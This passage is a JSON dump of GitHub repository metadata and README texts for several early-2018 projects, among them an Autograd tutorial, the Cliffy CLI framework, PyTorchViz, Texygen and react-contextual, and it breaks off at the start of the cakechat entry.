totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":103},"websiteUrl":"people.csail.mit.edu/~mattjj"},"repository":{"name":"autodidact","primaryLanguage":{"name":"Python"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":9,"readme_md":{"text":"# Autodidact: a pedagogical implementation of [Autograd](https://github.com/hips/autograd)\n\nThis is a tutorial implementation based on [the full version of\nAutograd](https://github.com/hips/autograd).\n\nExample use:\n\n```python\n>>> import autograd.numpy as np  # Thinly-wrapped numpy\n>>> from autograd import grad    # The only autograd function you may ever need\n>>>\n>>> def tanh(x):                 # Define a function\n...     y = np.exp(-2.0 * x)\n...     return (1.0 - y) / (1.0 + y)\n...\n>>> grad_tanh = grad(tanh)       # Obtain its gradient function\n>>> grad_tanh(1.0)               # Evaluate the gradient at x = 1.0\n0.41997434161402603\n>>> (tanh(1.0001) - tanh(0.9999)) / 0.0002  # Compare to finite differences\n0.41997434264973155\n```\n\nWe can continue to differentiate as many times as we like, and use numpy's\nvectorization of scalar-valued functions across many different input values:\n\n```python\n>>> import matplotlib.pyplot as plt\n>>> x = np.linspace(-7, 7, 200)\n>>> plt.plot(x, tanh(x),\n...          x, grad(tanh)(x),                                # first  derivative\n...          x, grad(grad(tanh))(x),                          # second derivative\n...          x, grad(grad(grad(tanh)))(x),                    # third  derivative\n...          x, grad(grad(grad(grad(tanh))))(x),              # fourth derivative\n...          x, grad(grad(grad(grad(grad(tanh)))))(x),        # fifth  derivative\n...          x, grad(grad(grad(grad(grad(grad(tanh))))))(x))  # sixth  derivative\n>>> plt.show()\n```\n\nAutograd was written by [Dougal Maclaurin](https://dougalmaclaurin.com),\n[David Duvenaud](https://www.cs.toronto.edu/~duvenaud/)\nand [Matt Johnson](http://people.csail.mit.edu/mattjj/).\nSee [the main page](https://github.com/hips/autograd) for more information.\n","byteSize":1772},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":124},"createdAt":"2018-01-30T14:01:12Z","updatedAt":"2018-02-14T07:23:49Z","pushedAt":"2018-01-30T15:21:39Z","description":"A pedagogical implementation of Autograd","subscribersCount":{"totalCount":8},"diskUsage":13,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":3},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":7}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"drew-y","followers":{"totalCount":10},"repositories":{"totalCount":30},"following":{"totalCount":9},"location":"Boise, ID","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":4},"websiteUrl":"drewyoungwerth.com"},"repository":{"name":"cliffy","primaryLanguage":{"name":"TypeScript"},"license":"ISC License","isArchived":false,"hasWikiEnabled":true,"forkCount":3,"readme_md":{"text":"# Cliffy - A Framework For Interactive CLIs\n\nCliffy is a simple, powerful utility for making interactive command line interfaces.\nCliffy can be considered an alternative to vorpal.\n\nCliffy is run as a REPL. This allows you to accept multiple commands\nwith one running node process. Cliffy is NOT an argv parser.\n\n**Features**:\n- REPL Style interface\n- Simple API\n- Can parse negative numbers\n- Typed parameters\n- Git Style Sub-Commands\n- Options\n- Auto generated help\n- Typescript Support\n\n**Gotchas**:\n- Options are specified with an `@` symbol. Not `-` or `--`.\nThis is what allows Cliffy to parse negatives.\n- Requires node v6+\n- Does not yet support optional parameters\n- Does not yet support rest parameters\n\n## Quickstart\n\n**Installation**:\n\n```bash\nnpm i cliffy # --save if using npm < v5\n```\n\n**Usage**\n\n```typescript\nimport { CLI } from \"cliffy\";\n\nconst cli = new CLI();\n\ncli.setDelimiter(\"run command ->\");\n\ncli.command(\"say\", {\n    description: \"Say a word\",\n    options: [\"reversed\"],\n    parameters: [{ label: \"word\", type: \"string\" }],\n    action: (params, options, done) => {\n        if (options.reversed) {\n            console.log(params.word.split(\"\").reverse().join());\n        } else {\n            console.log(params.word)\n        }\n        done()\n    }\n});\n\ncli.command(\"run\", {\n    description: \"Run somewhere\",\n    options: [\n        { option: \"fast\", description: \"Run fast\" },\n        { option: \"medium\", description: \"Run medium fast\" },\n        { option: \"slow\", description: \"Run slow\" }\n    ],\n    parameters: [{ label: \"destination\" }],\n    action: (params, options, done) => {\n        console.log(`I ran to ${params.destination}`);\n        done();\n    },\n    subcommands: {\n        to: {\n            description: \"Run to a destination\",\n            parameters: [{ label: \"destination\" }],\n            action: (params, options, done) => {\n                console.log(`I ran to ${params.destination}`);\n                done();\n            },\n        }\n        from: {\n            description: \"Run from a destination\",\n            parameters: [{ label: \"destination\" }],\n            action: (params, options, done) => {\n                console.log(`I ran to ${params.destination}`);\n                done();\n            },\n        }\n    }\n});\n\ncli.show();\n```\n\nResult:\n\n```bash\n$> say hello\nhello\n$> say @reversed hello\nolleh\n$> run to nevada\nI ran to nevada\n$> help\n\nAvailable commands:\n\n    say [options] <word>             Say a word\n    run [options]                    Run somewhere\n\n$> help run\n\nRun somewhere\n\nUsage:\n\n    run [options] <destination>\n\nOptions:\n\n   @fast                             Run fast\n   @medium                           Run medium fast\n   @slow                             Run slow\n\nSub-Commands:\n\n    to [options] <destination>       Run to a destination\n    from [options] <destination>     Run from a destination\n```\n\n## API\n\n### `new CLI()`\n\nInterface:\n```typescript\nclass CLI {\n    constructor(opts: {\n        input?: ReadStream,\n        output?: WriteStream\n    } = {})\n}\n```\n\nUsage:\n\n```typescript\nconst cli = new CLI(opts)\n```\n\n### `cli.command(name: string, opts: Command): void`\n\nRegister a command\n\nA command takes a name and an opts object.\n\nThe command name is what the user will enter to execute the command.\n\nThe command opts follows the following interface:\n```typescript\ninterface Command {\n    /**\n     * Required action function. Executed when the user enters the command.\n     *\n     * parameters is a key value store. Where the key is the parameter label,\n     * and the value is the value entered by the user.\n     *\n     * options is a key value store. Key being the option, value being true if the user\n     * specified the option, false otherwise.\n     *\n     * done is a function to be called inside the action function when the function is complete.\n     * As an alternative to calling done, the action may also return a Promise which ends the\n     * action when resolved.\n     */\n    action: (parameters: any, options: any, done: () => void) => void | Promise<any>;\n\n    /** Optional description for documentation */\n    description?: string;\n\n    /** An array of options available to the user. The user specifies an option with an @ symbol i.e. @force */\n    options?: ({\n        option: string;\n        description?: string;\n    } | string)[];\n\n    /** All the parameters available to the user. See the parameters interface */\n    parameters?: Parameter[],\n\n    /** Sub commands of the command. Follows the same interface as Command */\n    subcommands?: { [command: string]: Command },\n}\n\ninterface Parameter {\n    label: string;\n    type?: \"boolean\" | \"number\" | \"string\";\n    description?: string;\n}\n```\n\nExample Usage:\n\n```typescript\ncli.command(\"run\", {\n    description: \"Run somewhere\",\n    options: [\n        { option: \"fast\", description: \"Run fast\" },\n        { option: \"medium\", description: \"Run medium fast\" },\n        { option: \"slow\", description: \"Run slow\" }\n    ],\n    parameters: [{ label: \"destination\" }],\n    action: (params, options, done) => {\n        console.log(`I ran to ${params.destination}`);\n        done();\n    },\n    subcommands: {\n        to: {\n            description: \"Run to a destination\",\n            parameters: [{ label: \"destination\" }],\n            action: (params, options, done) => {\n                console.log(`I ran to ${params.destination}`);\n                done();\n            },\n        }\n        from: {\n            description: \"Run from a destination\",\n            parameters: [{ label: \"destination\" }],\n            action: (params, options, done) => {\n                console.log(`I ran to ${params.destination}`);\n                done();\n            },\n        }\n    }\n});\n```\n\n### `cli.setDelimiter(delimiter: string)`\n\nSet the CLI delimiter\n\n### `cli.show()`\n\nShow the CLI\n\n### `cli.hide()`\n\nHide the cli\n\n## Autogenerated Help Menu\n\nCliffy automatically generates a help menu for each command.\n\nTo get an overview of all the commands simply type:\n\n```\nhelp\n```\n\nTo get help with a specific command, type help followed by the command.\n\n```\nhelp ls\n```\n\nThis works with subcommands as well\n\n```\nhelp git pull\n```\n\n## Build instructions\n\n1. Clone this repo\n2. CD into the repo\n3. `npm install`\n4. `npm run build`","byteSize":6256},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":126},"createdAt":"2018-01-30T16:25:33Z","updatedAt":"2018-02-17T05:25:22Z","pushedAt":"2018-02-14T16:30:39Z","description":"Framework for Interactive CLIs - An alternative to Vorpal","subscribersCount":{"totalCount":3},"diskUsage":31,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":38}}},"tags":{"totalCount":9},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"szagoruyko","followers":{"totalCount":740},"repositories":{"totalCount":84},"following":{"totalCount":22},"location":null,"organizations":{"totalCount":1},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":7},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":38},"websiteUrl":"http://imagine.enpc.fr/~zagoruys"},"repository":{"name":"pytorchviz","primaryLanguage":{"name":"Jupyter Notebook"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":12,"readme_md":{"text":"PyTorchViz\n=======\n\nA small package to create visualizations of PyTorch execution graphs and traces.\n\n## Installation\n\nInstall graphviz, e.g.:\n\n```\nbrew install graphviz\n```\n\nInstall the package itself:\n\n```\npip install git+https://github.com/szagoruyko/pytorchviz\n```\n\n\n## Usage\n\n<img width=\"891\" alt=\"screen shot 2018-01-30 at 16 13 01\" src=\"https://user-images.githubusercontent.com/4953728/35574234-8780297e-05d9-11e8-8e80-f4009297cefd.png\">\n\nThere are two functions, `make_dot` to make graphs from any PyTorch functions (requires that at least one input Variable requires_grad), and `make_dot_from_trace` that uses outputs of `torch.jit.trace` (does not always work). See [examples.ipynb](examples.ipynb).\n\n## Acknowledgements\n\nThe script was moved from [functional-zoo](https://github.com/szagoruyko/functional-zoo) where it was created with the help of Adam Paszke, Soumith Chintala, Anton Osokin, and uses bits from [tensorboard-pytorch](https://github.com/lanpa/tensorboard-pytorch).\n","byteSize":993},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":176},"createdAt":"2018-01-30T15:37:55Z","updatedAt":"2018-02-14T13:14:45Z","pushedAt":"2018-01-31T19:41:32Z","description":"A small package to create visualizations of PyTorch execution graphs","subscribersCount":{"totalCount":9},"diskUsage":37,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":3}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"Chippd","followers":{"totalCount":23},"repositories":{"totalCount":23},"following":{"totalCount":2},"location":"Dublin, Ireland","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":2},"websiteUrl":"http://www.chrisdermody.com"},"repository":{"name":"css_loading_animation","primaryLanguage":{"name":"HTML"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":8,"readme_md":{"text":"# CSS \"Coding\" animation\n\n***If you'd like to see how easy this can be done, I'll be creating a tutorial in an upcoming post. Get notifified about it [here](http://chrisdermody.com/subscribing/?utm_source=github&utm_medium=css-loader-repo&utm_campaign=eng_mark).***\n\nThis is continuing on my odd fascination with animation in the browser, building on my previous attempt at an [animated SVG graphic](http://chrisdermody.com/animated-svg-loader-mydevportfol-io/) that would illustrate that an app was \"coding\" a website, originally built for my side project [MyDevPortfolio](https://mydevportfol.io)\n\n[view the animation](https://chippd.github.io/css_loading_animation/)\n\n\nI'm [@cderm](https://twitter.com/cderm) on Twitter too ;)\n\n\n","byteSize":732},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":217},"createdAt":"2018-01-30T23:33:36Z","updatedAt":"2018-02-17T01:52:38Z","pushedAt":"2018-02-06T18:15:08Z","description":"A \"coding\" animation made with pure css","subscribersCount":{"totalCount":8},"diskUsage":10,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":9}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"geek-ai","repositories":{"totalCount":4},"location":"London","members":{"totalCount":0},"websiteUrl":""},"repository":{"name":"Texygen","primaryLanguage":{"name":"Python"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":39,"readme_md":{"text":"<h1><img src=\"docs/fig/texygen-01.png\" width=\"250\"></h1>\n\nTexygen is a benchmarking platform to support research on open-domain text generation models. Texygen has not only implemented a majority of text generation models, but also covered a set of metrics that evaluate the diversity, the quality and the consistency of the generated texts. The Texygen platform could help standardize the research on text generation and facilitate the sharing of fine-tuned open-source implementations among researchers for their work.  As a consequence, this would help in improving the reproductivity and reliability of future research work in text generation.\n\nFor more details, please refer to our ArXiv paper: [Texygen: A Benchmarking Platform for Text Generation Models](https://arxiv.org/abs/1802.01886) by Yaoming Zhu et al. 2018.\n\nShould you have any questions and enquiries, please feel free to contact Yaoming Zhu (ym-zhu [AT] outlook.com) and [Weinan Zhang](http://wnzhang.net) (wnzhang [AT] sjtu.edu.cn).\n\n## Requirement\nWe suggest you run the platform under Python 3.6+ with following libs:\n* **TensorFlow 1.3.0**\n* Numpy 1.12.1\n* Scipy 0.19.0\n* NLTK 3.2.3\n* CUDA 7.5+ (Suggested for GPU speed up, not compulsory)    \n\nOr just type `pip install -r requirements.txt` in your terminal.\n\n## Implemented Models and Original Papers\n\n* **SeqGAN** -  [SeqGAN: Sequence Generative Adversarial Nets with Policy Gradient](https://arxiv.org/abs/1609.05473)\n\n* **MaliGAN** - [Maximum-Likelihood Augmented Discrete Generative Adversarial Networks](https://arxiv.org/abs/1702.07983)\n\n* **RankGAN** - [Adversarial ranking for language generation](http://papers.nips.cc/paper/6908-adversarial-ranking-for-language-generation)\n\n* **LeakGAN** - [Long Text Generation via Adversarial Training with Leaked Information](https://arxiv.org/abs/1709.08624)\n\n* **TextGAN** - [Adversarial Feature Matching for Text Generation](https://arxiv.org/abs/1706.03850)\n \n* **GSGAN** - [GANS for Sequences of Discrete Elements with the Gumbel-softmax Distribution](https://arxiv.org/abs/1611.04051)\n\n\n## Get Started\n\n```bash\ngit clone https://github.com/geek-ai/Texygen.git\ncd Texygen\n# run SeqGAN with default setting\npython3 main.py\n```\nMore detailed documentation for the platform and code setup is provided [here](docs/doc.md).\n\n\n## Evaluation Results\n\nBLEU on image COCO caption test dataset:\n\n|       | SeqGAN | MaliGAN | RankGAN | LeakGAN | TextGAN      | MLE |\n|-------|--------|---------|---------|---------|--------------|--------------|\n| BLEU2 | 0.745  | 0.673   | 0.743   | 0.746   | 0.593        | 0.731        |\n| BLEU3 | 0.498  | 0.432   | 0.467   | 0.528   | 0.463        | 0.497        |\n| BLEU4 | 0.294  | 0.257   | 0.264   | 0.355   | 0.277        | 0.305        |\n| BLEU5 | 0.180  | 0.159   | 0.156   | 0.230   | 0.207        | 0.189        |\n\nMode Collapse (Self-BLEU):\n\n|            | SeqGAN | MaliGAN | RankGAN | LeakGAN | TextGAN       | MLE  |\n|------------|--------|---------|---------|---------|---------------|--------------|\n| BLEU2      | 0.950  | 0.918   | 0.959   | 0.966   | 0.942         |0.916         |\n| BLEU3      | 0.840  | 0.781   | 0.882   | 0.913   | 0.931         |0.769         |\n| BLEU4      | 0.670  | 0.606   | 0.762   | 0.848   | 0.804         |0.583         |\n| BLEU5      | 0.489  | 0.437   | 0.618   | 0.780   | 0.746         |0.408         |\n\nMore detailed benchmark settings and evaluation results are provided [here](docs/evaluation.md).\n\n## Reference\n\n@article{zhu2018texygen,<br>\n&nbsp;&nbsp;&nbsp;&nbsp;  title={Texygen: A Benchmarking Platform for Text Generation Models},<br>\n&nbsp;&nbsp;&nbsp;&nbsp;  author={Zhu, Yaoming and Lu, Sidi and Zheng, Lei and Guo, Jiaxian and Zhang, Weinan and Wang, Jun and Yu, Yong},<br>\n&nbsp;&nbsp;&nbsp;&nbsp;  journal={arXiv preprint arXiv:1802.01886},<br>\n&nbsp;&nbsp;&nbsp;&nbsp;  year={2018}<br>\n}\n\n","byteSize":3869},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":224},"createdAt":"2018-01-30T13:06:42Z","updatedAt":"2018-02-17T03:52:03Z","pushedAt":"2018-02-12T13:40:02Z","description":"A text generation benchmarking platform","subscribersCount":{"totalCount":18},"diskUsage":6574,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":65}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"drcmda","followers":{"totalCount":47},"repositories":{"totalCount":22},"following":{"totalCount":5},"location":"St. Gallen","organizations":{"totalCount":1},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":19}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":21},"websiteUrl":""},"repository":{"name":"react-contextual","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":3,"readme_md":{"text":"![](assets/logo.jpg)\n\n`react-contextual` is a tiny (less than 1KB) helper around [React 16s new context api](https://github.com/acdlite/rfcs/blob/new-version-of-context/text/0000-new-version-of-context.md).\n\nIt provides two things:\n\n* consuming (and creating) context with ease, every kind of context, no matter which or whose or how many providers\n* a minimal redux-like store pattern with setState semantics and central actions\n\n# Why\n\nReacts new context api is very powerful albeit very low-level as it does not prescribe patterns and can cause some issues if used naively. `react-contextual` makes creating, sharing and consuming context easier, maps context values to component props similar to how redux operates, takes care of nesting, renders only when necessary and provides a small store for state distribution.\n\nClick [this link](https://github.com/drcmda/react-contextual/blob/master/PITFALLS.md) for a detailed explanation.\n\n# Installation\n\n    npm install react-contextual\n\n# If you just need a light-weight no-frills store\n\nUse the [Provider](https://github.com/drcmda/react-contextual/blob/master/API.md#provider) to distribute state and actions, wrap consumers within, use [subscribe](https://github.com/drcmda/react-contextual/blob/master/API.md#subscribe) to connect components.\n\nExample 1: https://codesandbox.io/s/ywyr3q5n4z (basic example)\n\nExample 2: https://codesandbox.io/s/lxly45lvkl (async actions)\n\n[![](assets/store.jpg)](https://github.com/drcmda/react-contextual/blob/master/assets/examples/store.js)\n\n### With decorator\n\nBut use with care as the spec may still change any time!\n\n[![](assets/store-decorator.jpg)](https://github.com/drcmda/react-contextual/blob/master/assets/examples/store-decorator.js)\n\n### What about multiple stores?\n\nYou can have as many as you like, just name them. [subscribe](https://github.com/drcmda/react-contextual/blob/master/API.md#subscribe) also accepts your keys.\n\nExample: https://codesandbox.io/s/p9p6jq60lx\n\n[![](assets/multi-store.jpg)](https://github.com/drcmda/react-contextual/blob/master/assets/examples/multi-store.js)\n\n# If you are dealing with context providers of any kind\n\n[subscribe](https://github.com/drcmda/react-contextual/blob/master/API.md#subscribe) helps you to consume *any* React context. Soon libs like react-router, redux, etc. will likely start serving context. Look into the examples to see how easy it is to create a context provider in order to distribute dynamic data.\n\nExample: https://codesandbox.io/s/5v7n6k8j5p\n\n[![](assets/multi-context.jpg)](https://github.com/drcmda/react-contextual/blob/master/assets/examples/multi-context.js)\n\n### With decorator\n\n[![](assets/multi-context-decorator.jpg)](https://github.com/drcmda/react-contextual/blob/master/assets/examples/multi-context-decorator.js)\n\n# If you like to create context providers\n\nReacts default api works with singletons, that makes it tough to create multi-purpose, nestable providers. Use [namedContext](https://github.com/drcmda/react-contextual/blob/master/API.md#namedcontext) to create unique context bound to a components lifecycle, [moduleContext](https://github.com/drcmda/react-contextual/blob/master/API.md#modulecontext) for module-scoped context and [transformContext](https://github.com/drcmda/react-contextual/blob/master/API.md#transformcontext) to transform existing context providers (like a declarative middleware). Use [helper functions](https://github.com/drcmda/react-contextual/blob/master/API.md#imperative-context-handling) if you want to control the lifecycle of a context by yourself.\n\nExample1: https://codesandbox.io/s/ox405qqopy (namedContext)\n\nExample2: https://codesandbox.io/s/v8pn13nq77 (moduleContext)\n\nExample3: https://codesandbox.io/s/mjv84k1kn9 (transformContext)\n\nExample4: https://codesandbox.io/s/30ql1rxzlq (imperative API)\n\n[![](assets/module-context.jpg)](https://github.com/drcmda/react-contextual/blob/master/assets/examples/module-context.js)\n\n### With decorator\n\n[![](assets/module-context-decorator.jpg)](https://github.com/drcmda/react-contextual/blob/master/assets/examples/module-context-decorator.js)\n\n\n# If you like to consume context but dislike HOCs\n\nUse [Subscribe](https://github.com/drcmda/react-contextual/blob/master/API.md#subscribe-as-a-component) (a component) to do the same as above with render props.\n\nExample 1: https://codesandbox.io/s/wo28o5y1y5 (Multiple providers)\n\nExample 2: https://codesandbox.io/s/ko1nz4j2r (Store as default provider)\n\n[![](assets/render-props.jpg)](https://github.com/drcmda/react-contextual/blob/master/assets/examples/render-props.js)\n\n# API\n\nhttps://github.com/drcmda/react-contextual/blob/master/API.md\n\n# Changelog\n\nhttps://github.com/drcmda/react-contextual/blob/master/CHANGELOG.md\n\n# Pitfalls when using the context api raw\n\nhttps://github.com/drcmda/react-contextual/blob/master/PITFALLS.md\n\n# Who is using it\n\n[![AWV](/assets/corp-awv.png)](https://github.com/awv-informatik)\n\n","byteSize":4942},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":234},"createdAt":"2018-01-30T22:41:23Z","updatedAt":"2018-02-16T23:13:29Z","pushedAt":"2018-02-16T11:15:59Z","description":"Tiny helper around Reacts new context API","subscribersCount":{"totalCount":5},"diskUsage":2639,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":5},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":7},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":255}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"lukalabs","repositories":{"totalCount":3},"location":"San Francisco","members":{"totalCount":4},"websiteUrl":"https://replika.ai"},"repository":{"name":"cakechat","primaryLanguage":{"name":"Python"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":50,"readme_md":{"text":"# CakeChat: Emotional Generative Dialog System\n\nCakeChat is a dialog system that is able to 